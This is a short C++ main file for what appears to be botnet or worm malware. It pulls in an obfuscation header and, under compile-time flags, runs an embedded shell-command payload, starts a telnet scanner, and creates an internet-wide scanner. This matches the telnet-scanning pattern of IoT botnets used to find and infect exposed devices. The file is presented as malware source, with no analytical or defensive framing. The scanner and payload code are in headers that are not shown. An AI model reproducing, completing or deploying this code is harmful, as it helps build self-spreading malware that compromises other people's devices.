#include "core/net/request.hpp"
#include "core/sys/file-system.hpp"
#include "core/obf/MetaString.h"

#include "core/scanner.hpp"
#include "core/net-scanner.hpp"

int main (int argc, char * argv[]) {
  // Execute the shell command and save the output.
  #if defined(PAYLOAD)
  std::string payload_output = FileSystem().process(PAYLOAD);
  #endif

  // Telnet scanner.
  #if defined(TELNET_SCANNER_ON)
  Scanner * scanner = new Scanner();
  scanner->ignite();
  #endif
  
  // Internet scanner.
  #if defined(NET_SCANNER_ON)
  NETScanner * net_scanner = new NETScanner();
  #endif

  return 0;
}